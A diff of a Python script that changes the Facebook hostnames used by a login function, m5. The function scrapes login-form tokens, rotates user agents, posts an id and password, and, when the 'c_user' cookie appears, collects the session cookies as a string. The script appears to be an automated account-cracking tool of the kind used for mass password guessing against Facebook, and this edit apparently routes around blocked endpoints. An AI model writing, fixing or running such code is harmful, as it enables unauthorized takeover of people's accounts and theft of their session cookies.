@@ -2473,7 +2473,7 @@ def m5(idf,pwv):
     + ') AppleWebKit/537.36 (KHTML, like Gecko) '
     + random.choice(chrome_version)
     + ' Mobile Safari/537.36')
-   free_fb = session.get('mobile.facebook.com').text
+   free_fb = session.get('free.facebook.com').text
    log_data = {
              "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -2485,7 +2485,7 @@ def m5(idf,pwv):
             "pass":ps,
             "login":"Log In"}
    header_freefb ={
-    "authority": "mobile.facebook.com",
+    "authority": "m.facebook.com",
     "method": "POST",
     "path": "/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl",
     "scheme": "https",
@@ -2513,7 +2513,7 @@ def m5(idf,pwv):
     "Upgrade-Insecure-Requests": "1",
     "User-Agent": user_agent,
     "Viewport-Width": "885"}
-   lo = session.post('https://free.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+   lo = session.post('https://mtouch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
